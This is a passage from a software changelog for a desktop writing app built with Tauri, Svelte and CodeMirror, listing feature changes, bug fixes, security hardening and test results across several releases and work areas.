- `npm run check`: 0 errors, 0 warnings. `npm run build`: passes. `npm run test:source`:
  exit 0. `cargo build --release --features custom-protocol`: passes.
- Not verified: STT and the memory sidecar were never exercised against a live binary,
  and the `bootStep` sentinel fix has only been type-checked and built, not observed in
  a running app. `src-tauri/target` was cleared at the user's request, so both await the
  next build.

### 2026-09-25: settings, native models, and PIN repair

#### Changed
- Editor typography is shared from first paint through CodeMirror prose and Script editing, with bundled mono fonts and validated numeric settings.
- STT/TTS/LLM health now reflects process readiness, lazy TTS model load, real LLM completion, bounded polling, cleanup after failure, and Settings runtime tests.
- Release builds preflight model assets and package native STT/TTS/memory runtimes with PyInstaller; Rust prefers packaged executables, rejects untrusted renderer-supplied roots, and restricts development fallback interpreters to PATH command names.
- App/document locking defaults off, requires confirmed PIN setup, fails closed on unknown keychain state, gates the main and widget shells, rejects empty-PIN verification, and adds session backoff/removal paths. AI memory loopback calls use a per-launch token.

#### Verification
- `npm run check`, `npm run test:source`, `npm run test:assets`, `npm run test:resolve`, `npm run test:widget`, `npm run test:widget-proof`, and `npm run test:e2e` pass.
- `npm run test:onboard` reports an explicit `SKIP` until a fresh frontend bundle exists; no frontend, PyInstaller, Tauri, or installer build was run.

### Area 8: export fidelity + pandoc bundle

#### Changed
- **Shared export preprocess** (convert.rs, used by convert_run + compile_run): `![[embeds]]` inlined (missing/locked → note), `[[links]]` → display text (standalone files, documented), frontmatter YAML block + title default, `.attachments/` staged into the pandoc tempdir with `--resource-path` (built-in HTML keeps `<img>` + vault note)
- **Compile join**: per-doc `# Title` + content demoted one level (no collisions), `---` separators, 5M-char cap refusing with zip-of-chapters guidance
- **Pandoc decision: bundle** (signed off). 3.11 measured 41.8 MB download / **233.6 MB exe** — budget ~90–120 MB installer, not 30–50; binary git-ignored with fetch docs, `externalBin` registered, `convert_status.bundled` distinguishes sidecar vs PATH
- **Menus show all six formats always**, pandoc-gated disabled with inline reason; Novel compile select gated the same; palette gains a compile-format select + preflight (no throw-at-click) + bulk progress/cancel; fountain via one shared `downloadFountain`
- **batchExport**: 4-way `mapLimit` (same shape as chapter batches), progress, cancel, streamed DEFLATE zip, attachments bundled via binary-safe `attachment_read` (dedupe helper exported + tested)
- **Publish: Rust wins** — TS twin deleted (regex markdown, raw customJs). Rust now honors customCss/customJs (breakout-neutralized), inlines images as data URIs (2 MB cap, counted), single-file scope documented

#### Tests
- `cargo test convert_`: join/demote, slugify, frontmatter, wikilinks, embeds, attachments, preprocess order, bundled detection (8 passed)
- `tests/export-batch.mjs` (12): dedupe, bounded concurrency, 20-tab unique zip + bundled attachments, no-pandoc friendly failure, cancel

### Area 7: Reader structure + controls

#### Changed
- **Reading controls**: one compact row (serif/sans/mono, A± 12–24 with reset-to-base, narrow/comfortable/wide, app/light/sepia/dark) persisted per-Reader (`readerFont/readerSize/readerMeasure/readerTheme`, size 16 default reproduces today's look)
- **Rendering honesty**: stored bodies render through the shared escape-first markdown→HTML path (headings/lists/quotes are real structure now, not literal `#`); bookparse emits `#`/`- `/`| ` structure and `![alt](dropped-image)` markers; only that exact target renders a captioned placeholder (transclude/export behavior unchanged); transclude islands pass through untouched
- **Position that survives reflow**: heading-id + intra-section ratio anchors in frontmatter (ratio persisted as before for back-compat), restored after `document.fonts.ready`; library cards gain % progress bars + cover slot (EPUB art saved via attachment on import, kind badge when empty)
- **Read-aloud tracking**: Reader passes pre-split sections; the button plays section-by-section with highlight + autoscroll (selection still wins; editors keep the single-shot path); long sections chunk at 6000 chars — never one giant call; stop resolves pending playback (no hangs, no tail)
- **ONE ReaderProse** component (typography/theme/measure + native content-visibility windowing + progressive 12+8 section append). MarkdownViewer stays CodeMirror: it is an editable raw-file surface with save — converging it would delete editing. EditorPane reading mode untouched for the same reason
- Mobile: toolbar + controls wrap at 480px, content padding scales

#### Tests
- `tests/reader-sections.mjs` (24): splitting/islands, TTS strip, chunk bounds, anchor math, markdown structure, image-target scoping
- `tests/reader-surface.mjs` (15): seeded book → sections/cards/progress/cover-slot, controls live-switch, read-aloud entry
- `tests/audio-stop.mjs` (6): stop-mid-decode resolves with no tail, live stop halts source, normal path intact

### Area 6: voice sidecar lifecycle

#### Changed
- **One managed child owner**: `ManagedSidecar{port}` in sidecar.rs serves all 5 managers — dead handles reaped + respawned (never early-Ok on a corpse), stop() is kill()+wait() (no zombies), Drop kills best-effort so children die with the app, stale port holders reclaimed (orphan sidecar killed + restarted, foreign holders fail closed with a typed error)
- **No indefinite hangs**: every sidecar reqwest client carries a timeout (30s default, 180s transcribe/synthesize/LLM); empty LLM/memory content is a real error, not `""`
- **Startup without races**: one `ensureSidecar()` + `pollUntilHealthy()` (500ms/15s, "Starting Moonshine… Ns" progress) replaces the fixed 500ms/1s sleeps in STT/TTS/LLM/memory; LLM cold load awaits readiness so ghost can't cloud-fallback on first run; Mic/TTS buttons gate on model_loaded only after a probe (never disabled cold) with the fetch hint wired
- **Validation**: `sidecarValidate.ts` (traversal rejected, shape-checked) on Settings blur with inline errors; new `sidecar_python_probe` command (`python --version`, preview degrades readable); STT/TTS servers fail closed on `..` escapes and missing explicit picks (no silent bundled fallback); empty-path guards on stt/tts start
- **TTS stop actually stops**: live source handle with stop()+disconnect() + mid-decode generation guard (decode caveat documented); ReadAloudButton gains a real loading state; MicButton offers one-tap browser dictation on sidecar failure (explicit tap = consent, never auto-switch — panel holds no position either way)
- **Mobile/voice**: 44px mic/TTS targets under 480px; Web Speech errors surface one-line reasons (not-allowed/no-speech/network)

#### Tests
- `cargo test managed_`: invalid spawn, foreign-port fail-closed, dead-handle respawn, stop-reaps (4 passed)
- `tests/sidecar-validate.mjs` (18), `tests/ensure-poll.mjs` (9: flaky-health boot, cap, short-circuit, failure), `tests/sidecar-resolve.py` (16 against the real server code)

### Area 5: AI core dedupe + hardening

#### Changed
- **Slot duplication deleted**: one `resolveSlot()` in commands.rs (was ×3 endpoint/model pairs), one `post_chat_completions()` for ai_generate/structurize, one `guardRate()` + shared `friendlyEndpointError()` via `src/lib/aiRequest.ts` (was ×3 copies each in AiPanel), providerTest.ts confirmed as the single `/models` probe (Settings + panel mount)
- **Silent failures fixed**: ai_generate/structurize check HTTP status like the stream path (401/403 key, 429 rate, 408 timeout) with one 429/503 retry + backoff, never `""` on empty choices; ghost failures record to a `ghostStatus` store (surfaced in the panel's Ghost tab) instead of warn→null; RAG/memory shortfalls show a one-line notice in the context chip; structurize remote-fallback warns with reason; `sidecar_start("")` is a typed error at the Rust boundary
- **Ghost disambiguated**: GhostPanel→DocForkPanel, GhostBadge→ForkBadge (fork UI, not autocomplete); Ghost tab is live (enable toggle, small-slot probe with latency, last-suggestion status, routing note); routing enforced — ghost reads local :8093 if enabled else small slot, callers pass workspace only
- **harness.ts→memorySidecar.ts** (port 8092, not legacy 8080) with a deprecated re-export shim; llm sidecar takes `--ctx-size` from settings
- **Panel UX**: privacy lock badge on private workspaces; Replace always confirms (Insert-instead one click away); write-back bar keyboard/touch reachable (was hover-only) and hidden on Error/Locked messages; writeBack is a FIFO queue (rapid clicks no longer drop events); Thinking… shows elapsed/total per path timeouts; mobile header wraps ≤480px, sheet 88vh, action bars visible on touch
- **Small model as first-class**: `smallModelContextLength` (llama-server ctx, applies on restart) + `useSmallAsMain` route chat/Composer/Structurize at lfm2.5-350m, with Settings controls

#### Tests
- `cargo test ai_slot`: resolveSlot defaults/blanks/explicit + status map (4 passed)
- `tests/ai-request-unit.mjs` (19), `tests/writeback-queue.mjs` (8), `tests/ai-error-probe.mjs` (dead-endpoint reject friendly + structurize local fallback)
- e2e anchors updated to the new contracts (slot routing, fork rename, confirm, badge, countdown, ctx setting, Rust hardening)

### Area 4: brutalist + glass as real themes

#### Changed
- **Brutalist is its own palette now** (was byte-identical to dark): hazard theme — near-black concrete `#100F0D`, safety-amber `#FFB000` accent, 0 radius + hard ink shadows via tokens (not overrides), amber selection/focus, per-theme CodeMirror hazard editor
- **Glass glows**: luminous mint accent `#A9E8C6`, `rgba(143,199,169,0.3)` selection, `--accent-glow` on active nav/tabs/primary buttons, frosted blur extended to palette/modals/dialogs, swollen radius scale via tokens, translucent mint CodeMirror editor
- **Token gaps closed**: `--surface-elevated`, `--accent-on`, `--accent-semantic-yellow` defined in all 4 themes + system fallback; fallback gains `--ws-inbox/files/properties`; `--danger` aliased to `--error`; light `--ink-muted` darkened to `#5F5C50` for 4.5:1 small-text contrast
- **Literal-color bypasses tokenized**: on-accent whites → `var(--text-on-accent)` (TabBar, Logs, NodeMap, Projects, VaultRename, VersionHistory, FileBrowser), AiPanel cancel → semantic-red, SettingsPane perf → semantic-green/`--warning`, charts/craft/skills/usage hues → semantic tokens (SVG-safe `var()`), NodeMap rings follow theme accent/warning, EditorPane snippet expansion deferred past the update cycle (same crash class as autocorrect — expansion was silently dead)
- **Kept fixed deliberately** (verified, not overlooked): ConflictBanner amber (fixed bg carries contrast in every theme — tokenizing would break it), recording-red/TTS-blue whites (4.5+/5.2:1 on fixed brand bgs), PDF page white (document fidelity), canvas card hues + NodeMap dots (user/data identity colors), streak heat cells (GitHub-style convention)
- Decision: keep all 4 themes (signed off); no in-repo "3 themes" text exists (external spec holds that)

#### Tests
- `tests/theme-sweep.mjs` extended (50 checks): per-theme token contract, brutalist/glass distinctness, WCAG contrast text-on-bg + on-accent-on-accent ≥ 4.5:1 (all pass with margin), editor-palette parity with app.css, mounts under all 4 themes

### Area 3: app-shell navigation

#### Changed
- **One grouping source**: `src/lib/workspaceGroups.ts` (Create/Capture/Organize/Explore) now drives both the desktop sidebar headers and the mobile More menu — they can't drift apart again. Sidebar keeps its drag-reorder, recency auto-sort, pinned Home, and inbox/canvas/files hide-list; only the group definition moved
- **Mobile More menu grouped**: flat 15-icon grid replaced by Create/Capture/Organize/Explore/Tools sections; Craft/Stats/Skills duplicate entries removed (single Settings — all three were Settings tabs); mobile nav visits now feed recency like desktop
- **Home promoted to top** (signed off: Home only): persistent Home button at the start of the BreadcrumbBar; sidebar keeps its pinned Home
- **Mobile bottom stack fixed**: StatusBar no longer renders on phones (was a second strip above BottomBar); a quiet save-state dot in the BottomBar preserves the persist signal. Docs/words/streak/stats remain one tap away on Home
- Removed stale `"craft"` from `lockCoveredWorkspaces` (redirects to Settings on the same tick, never a live workspace)
- Desktop TabBar + BreadcrumbBar stay separate (signed off); typing-focus auto-collapse already handles the crowded-while-writing case

#### Tests
- `tests/shell-nav.mjs` (`npm run test:shell`, 18 checks): desktop + mobile dual boot — unified sections, no duplicates, palette still surfaces Inbox/Canvas/Files, mobile reachability, no StatusBar on phones, promoted-Home navigation
- `tests/theme-sweep.mjs` (`npm run test:themes`, 12 checks): shell mounts error-free under all 4 themes (dark, light, brutalist, glass)

### Area 2: lazy shell + Novel Studio surface

#### Bug Fixes
- **Lazy workspaces could go blank forever in silence**: `LazyWorkspace` swallowed load errors (empty `.catch`) and a never-settling chunk stayed on "Loading…" permanently. Loads now go through `src/lib/lazyLoad.ts` (`loadWithTimeout`, 9s): rejections and hangs reach a retryable failed state showing the reason, log `[LazyWorkspace] failed to load <label>: …`, and offer a Retry button that re-invokes the loader. All 14 lazy call sites labeled; `main.ts` logs `vite:preloadError` app-wide. Code-splitting itself untouched
- **Novel Studio had no reachable writing surface**: new projects landed on an empty beat board (editor needs a selected scene). `createProject` now bootstraps Act 1 → Sequence 1 → Scene 1 (scenes only render inside a sequence) and opens it immediately; empty projects show an unmissable "Start writing" affordance doing the same
- **Novel import dropped you on the board**: `handleImportFile` now selects the first imported scene so you land in the editor on chapter 1

#### Tests
- `tests/lazy-load-probe.mjs` (`npm run test:lazy`): documents the jsdom stylesheet-link mechanism per workspace (informational by design)
- `tests/lazy-load-failure.mjs` (`npm run test:lazyfail`): rejection/hang/success contract of the loader (9 checks)
- `tests/novel-surface.mjs` (`npm run test:novel`): proves the failure path through the real component (failed state + Retry + labeled log); board happy-path phases run wherever chunks actually resolve and are joined by new e2e static anchors

### Just Write core editor

#### Bug Fixes
- **Autosave snap-back**: the doc-open effect rebuilt the editor on every `$currentDoc` assignment, including the autosave metadata refresh ~500ms after each pause — typed text visibly reverted to stale store content. The editor now rebuilds only on a new doc id (`openDocId` guard); regression-covered by `tests/write-probe.mjs` (instance-survival + live-content checks)
- **Undo history wipe on settings changes**: theme/font/autocorrect/dictionary edits (and typewriter/focus toggles) destroyed and recreated the `EditorView`, resetting CodeMirror `history()`. All four now live in `Compartment`s reconfigured in place via `reconfigureAppearance()`
- **Autocorrect never fired**: the shared plugin dispatched synchronously inside `ViewPlugin.update`, which CodeMirror forbids — every Layer 1/2 fix crashed (`Calls to EditorView.update are not allowed while an update is in progress`) and was dropped. Fixes are now scheduled via `queueMicrotask` and re-validated against the live doc before applying
- **Ghost autocomplete rendered as a bottom-center popup** instead of at the cursor. Now an inline `Decoration.widget` at the selection head (`src/lib/ghostWidget.ts`, `cm-ghost-inline`); Tab/Esc, debounce, and lock/privacy gating unchanged; stale cross-doc suggestions dismissed on doc switch
- **Rust save path swallowed disk errors**: `save_doc` ignored `write_to_disk` failures (`let _`), so SQLite and files-on-disk could silently diverge. Disk errors now propagate to the caller like `atomic_save` already did
- **File watcher never fired**: the `notify` watcher was dropped at the end of `setup_file_watcher`; now intentionally leaked for app lifetime (`std::mem::forget`)
- Removed stale "never wired" comment above the (actually wired) `searchKeymap`; Ctrl+F panel opening is now probe-tested

#### Tests
- `tests/write-probe.mjs` (`npm run test:write`): real `EditorView.dispatch` typing — existing-doc render/type/persist, tab switching without cross-contamination, split-pane independence, live autocorrect, Ctrl+F panel (25 checks)
- `tests/ghost-widget.mjs` (`npm run test:ghost`): inline widget render/follow/replace/clear (11 checks)
- `tests/autocorrect-unit.mjs` (`npm run test:autocorrect`): rule-table spot checks + custom-dict veto (16 checks)

## 0.2.1 (2026-09-20)

### New Features
- **Home dashboard Goals section**: Docs with word-count targets now appear on the home page with progress bars, deadlines, and overdue indicators
- **Canvas inline editing**: Double-click any card on the canvas board to edit title and body in place — Escape cancels, Enter/blur commits
- **DockSplit drag-resize dividers**: Reusable vertical + horizontal dividers for Novel, Inbox, Projects, Canvas, and Reader workspaces, with per-workspace persisted splits
- **Side-by-side split editors**: Toggle split pane in Write workspace; both panes autosave independently; AI write-back targets main or split pane
- **Find/replace (Ctrl+F)**: `@codemirror/search` integration in EditorPane, JustWriteWorkspace, and split pane
- **Shared editorFocus module**: Typewriter mode and focus dimming extracted to `src/lib/editorFocus.ts` for reuse across all editors

### Editor-First UI
- Collapsible sidebar (Ctrl+B) and inspector toggle (Ctrl+I)
- AI panel minimize/restore with Ctrl+J
- BreadcrumbBar doubles as a command bar with workspace toggle buttons
- Per-workspace Focus Editor toggles (Docs, Inbox, Projects)
- Auto-hide chrome during typing: tab bar and breadcrumb collapse after 2.5s idle, restore on mouse-to-top or Escape
- Compact mode for tighter chrome
- No floating icons or glass effects — all solid backgrounds

### Settings Overhaul
- Skills, Craft, and Stats moved into Settings as embeddable categories
- Settings deep-link store (`settingsCategory`) with `openSettingsAt()` navigation
- Old workspace IDs redirect to Settings automatically

### Performance
- SettingsPane and AiPanel lazy-loaded (code-split)
- `modulePreload.polyfill: false` for smaller initial bundle
- Heavy routes wrapped in `LazyWorkspace.svelte`
- Persisted UI chrome prefs (`jwe-ui-panels` localStorage)

### Backend
- `dashboard_goals` Rust command + SQL query for docs with word-count targets
- Browser preview mock for `dashboard_goals` in browserBackend

### Bug Fixes
- Removed floating palette circle and sidebar expand button (no more floating triggers)
- All overlays use solid `var(--bg-primary)` backgrounds
- StatusBar docked Search + Capture buttons

### Maintenance
- Removed stale `api.ts.bak` backup file
- E2e test coverage for inline canvas editing and goal progress wiring
- All 143 API commands verified paired between Rust backend and TS frontend
- Zero encoding/mojibake issues in source files
- 0 npm/Cargo dependency issues

---

## 0.2.0 (2026-09-18)

Initial signed release.

### Core
- Tauri v2 + Svelte 5 + CodeMirror 6 writing app
- 12 writing workspaces: Write, Docs, Inbox, Projects, Novel, Script, Canvas, NodeMap, Reader, Logs, Settings (with embedded Skills/Craft/Stats)
- Full-text search, backlinks, version history with snapshots
- AI panel with chat, Composer, Structurize, Ghost autocomplete
- Voice: STT (Moonshine GGUF) and TTS (Kokoro) via sidecar processes
- Local LLM integration (LFM 2.5-350M via llama.cpp)
- AI memory sidecar with cross-session facts and secret scrubbing

### Import/Export
- EPUB, PDF, DOCX, Markdown, Fountain import
- Export to Markdown, TXT, HTML, DOCX, EPUB, PDF
- Novel compile to multiple formats
- Script export to Fountain and HTML

### Canvas & Node Map
- Freeform canvas board with draggable cards, edges, and doc linking
- Node Map for document relationship visualization
- Beat board for novel structure

### Editor Features
- Typewriter mode, focus dimming, autocorrect
- Goal tracking with word-count targets and deadlines
- Daily notes with location/weather stamps
- Templates for reusable document structures
- Lock/unlock documents for privacy
- Pinned documents for quick access

### Build
- NSIS installer for Windows
- Auto-updater with signed releases
- Browser preview backend for development